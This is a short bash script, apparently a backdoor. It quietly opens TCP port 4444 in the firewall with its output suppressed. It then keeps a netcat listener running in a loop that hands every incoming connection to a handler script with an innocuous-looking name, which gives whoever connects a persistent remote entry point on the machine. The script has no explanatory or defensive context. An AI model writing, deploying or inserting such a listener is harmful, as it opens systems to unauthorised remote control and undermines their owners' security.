#!/bin/bash

PORT=4444
HANDLER_PATH="/usr/local/bin/sys-handler.sh"

# Open port in firewall
firewall-cmd --permanent --add-port=${PORT}/tcp >/dev/null 2>&1
firewall-cmd --reload >/dev/null 2>&1

echo "[+] Starting server on port $PORT..."
while true; do
    nc -l -p "$PORT" -c "bash $HANDLER_PATH"
    sleep 1
done
